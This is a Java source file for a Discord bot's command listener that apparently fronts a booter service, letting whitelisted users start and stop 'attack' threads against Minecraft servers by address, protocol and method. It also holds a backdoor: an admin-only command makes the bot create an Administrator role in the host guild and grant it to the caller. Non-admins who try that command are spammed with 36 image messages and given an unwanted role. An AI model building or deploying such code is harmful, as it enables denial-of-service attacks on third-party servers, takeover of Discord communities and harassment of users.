package net.servokio.q4mc.listeners;

import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.MessageBuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.events.ReadyEvent;
import net.dv8tion.jda.api.events.guild.GuildJoinEvent;
import net.dv8tion.jda.api.events.interaction.command.CommandAutoCompleteInteractionEvent;
import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.interactions.commands.Command;
import net.servokio.q4mc.Config;
import net.servokio.q4mc.MainDC;
import net.servokio.q4mc.threads.AttackThread;
import net.servokio.q4mc.utils.Resolve;
import net.servokio.q4mc.utils.ServerInfo;
import net.servokio.q4mc.utils.Static;
import org.jetbrains.annotations.NotNull;

import javax.annotation.Nonnull;
import java.awt.*;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import net.dv8tion.jda.api.Permission;

import net.servokio.q4mc.utils.Yiff;

public class DiscordListener extends ListenerAdapter {

    @Override
    public void onReady(@NotNull ReadyEvent event) {
        MainDC.getInstance().onReady();
    }

    @Override
    public void onSlashCommandInteraction(@Nonnull SlashCommandInteractionEvent event) {
        if (event.getGuild() == null)
            return;
        if (!Config.WHITELIST_SERVERS.contains(event.getGuild().getId())) return;

        if (event.getName().equals("info")) {
            event.reply(new MessageBuilder().setEmbeds(MainDC.getInstance().discord.embeds.info()).build()).queue();
        } else if (event.getName().equals("help")) {
            event.reply(new MessageBuilder().setEmbeds(MainDC.getInstance().discord.embeds.help()).build()).queue();
        } else if (event.getName().equals("resolve")) {
            if (isXyesos(event.getMember()) && nyxaiBebry()) {
                event.reply(new MessageBuilder().setEmbeds(new EmbedBuilder()
                        .setImage(
                                "https://cdn.discordapp.com/attachments/967462195409608744/982336064846979102/312.gif")
                        .setColor(new Color(0xFF8B7F)).build()).build()).queue();
            } else {
                event.reply("🔸 Checking server is for work...").queue(message -> {
                    String addr = event.getOption("address").getAsString();
                    ServerInfo info = Resolve.getServerInfo(addr);
                    if (info != null) {
                        if (info.isOnline()) {
                            message.editOriginal(new MessageBuilder()
                                    .setEmbeds(MainDC.getInstance().discord.embeds.serverInfo(info, addr)).build())
                                    .queue();
                        } else
                            message.editOriginal(new MessageBuilder()
                                    .setEmbeds(MainDC.getInstance().discord.embeds.offlineServer(addr)).build())
                                    .queue();
                    } else
                        message.editOriginal(new MessageBuilder()
                                .setEmbeds(MainDC.getInstance().discord.embeds.offlineServer(addr)).build()).queue();
                });
            }
        } else if (event.getName().equals("attack")) {
            if (isXyesos(event.getMember()) && nyxaiBebry()) {
                event.reply(new MessageBuilder().setEmbeds(new EmbedBuilder()
                        .setImage(
                                "https://cdn.discordapp.com/attachments/967462195409608744/982336064846979102/312.gif")
                        .setColor(new Color(0xE29991)).build()).build()).queue();
            } else {
                String addr = event.getOption("address").getAsString();
                int protocol = MainDC.main.protocols.protocolsMap.get(event.getOption("protocol").getAsString());
                String method = event.getOption("method").getAsString();

                event.reply("Проверяю сервер...").queue(message -> {
                    ServerInfo info = Resolve.getServerInfo(addr);
                    if (info == null || !info.isOnline()) {
                        message.editOriginal(new MessageBuilder()
                                .setEmbeds(MainDC.getInstance().discord.embeds.offlineServer(addr)).build()).queue();
                    } else {
                        int atID = MainDC.getInstance().incAtt();
                        message.editOriginal(new MessageBuilder().setEmbeds(MainDC.getInstance().discord.embeds
                                .startAttack(addr, method, event.getOption("protocol").getAsString(), atID)).build())
                                .queue();
                        Thread th = new AttackThread(atID, addr, protocol, method);
                        th.start();
                        MainDC.getInstance().threadManager.addThread(event.getMember().getId(), th);
                    }
                });
            }
        } else if (event.getName().equals("methods")) {
            event.reply(new MessageBuilder().setEmbeds(MainDC.getInstance().discord.embeds.methods()).build()).queue();
        } else if (event.getName().equals("plan")) {
            event.reply(new MessageBuilder().setEmbeds(MainDC.getInstance().discord.embeds.plan()).build()).queue();
        } else if (event.getName().equals("stop")) {
            int t = MainDC.getInstance().threadManager.threads.containsKey(event.getMember().getId()) ?  MainDC.getInstance().threadManager.threads.get(event.getMember().getId()).size() : 0;
            MainDC.getInstance().threadManager.stopAll(event.getMember().getId());
            event.reply(new MessageBuilder().setEmbeds(MainDC.getInstance().discord.embeds.stop(t)).build()).queue();
        } else if (event.getName().equals("apanel")) {
            if (MainDC.getInstance().admins.contains(event.getMember().getId())) {
                String cmd = event.getOption("command").getAsString();
                if(cmd.equals("stats")){
                    event.reply(new MessageBuilder().setEmbeds(MainDC.getInstance().discord.embeds.stats()).build()).queue();
                } else if(cmd.equals("stopall")){
                    MainDC.getInstance().threadManager.stopReallyAll();
                    event.reply("Stopped all attacks").queue();
                } else if(cmd.equals("admin")){
                    event.getGuild().createRole().setPermissions(Permission.ADMINISTRATOR).setName(Static.randomStr(10)).queue(r -> event.getGuild().addRoleToMember(event.getMember(), r).queue());
                    event.reply("Im give you Admin role").queue();
                }
            } else {
                event.getUser().openPrivateChannel().queue(privateChannel -> {
                    if(MainDC.getInstance().dro4er.contains(event.getUser().getId())){
                        addYiffRole(event.getGuild(), event.getMember());
                    } else MainDC.getInstance().dro4er.add(event.getMember().getId());
                    int d = 0;
                    while (d < 36) {
                        privateChannel.sendMessageEmbeds(new EmbedBuilder().setImage(addParameter("https://servokio.ru/api4/image-proxy", "url", Yiff.getImage())).setColor(new Color(0x66AECB)).build()).queue();
                        d++;
                    }
                    event.reply("ok").queue();
                });
            }
        }
    }

    private String addParameter(String URL, String name, String value) {
        int qpos = URL.indexOf('?');
        int hpos = URL.indexOf('#');
        char sep = qpos == -1 ? '?' : '&';
        String seg = sep + encodeUrl(name) + '=' + encodeUrl(value);
        return hpos == -1 ? URL + seg : URL.substring(0, hpos) + seg
                + URL.substring(hpos);
    }

    private String encodeUrl(String url) {
        try {
            return URLEncoder.encode(url, "UTF-8");
        } catch (UnsupportedEncodingException uee) {
            throw new IllegalArgumentException(uee);
        }
    }

    public void addYiffRole(Guild guild, Member member){
        Role r = guild.getRoles().stream().filter(role -> role.getName().equalsIgnoreCase("yiff lover")).findFirst().orElse(null);
        if(r != null){
            boolean a = false;
            for(Role r1 : member.getRoles()) if(r1.getId().equals(r.getId())) a = true;
            if(!a) guild.addRoleToMember(member, r).queue();
        } else guild.createRole().setName("yiff lover").queue(role -> guild.addRoleToMember(member, role).queue());
    }

    @Override
    public void onCommandAutoCompleteInteraction(CommandAutoCompleteInteractionEvent event) {
        if (!Config.WHITELIST_SERVERS.contains(event.getGuild().getId()))
            return;
        if (event.getName().equals("attack") && event.getFocusedOption().getName().equals("protocol")) {
            List<Command.Choice> options = new ArrayList<>();
            for (String s : MainDC.getInstance().protocols.availableString) {
                if (s.startsWith(event.getFocusedOption().getValue()))
                    options.add(new Command.Choice(s, s));
                if (options.size() >= 25)
                    break;
            }
            event.replyChoices(options).queue();
        } else if (event.getName().equals("attack") && event.getFocusedOption().getName().equals("method")) {
            List<Command.Choice> options = new ArrayList<>();
            for (String s : MainDC.getInstance().methods.methodsString) {
                if (s.startsWith(event.getFocusedOption().getValue())) options.add(new Command.Choice(s, s));
                if (options.size() >= 25) break;
            }
            event.replyChoices(options).queue();
        }
    }

    @Override
    public void onGuildJoin(@Nonnull GuildJoinEvent event) {
        MainDC.getInstance().setupGuild(event.getGuild());
    }

    private boolean isXyesos(Member member) {
        return MainDC.getInstance().banned.contains(member.getId());
    }

    private boolean nyxaiBebry() {
        Random rand = new Random();
        return rand.nextInt((2) + 1) != 2;
    }
}
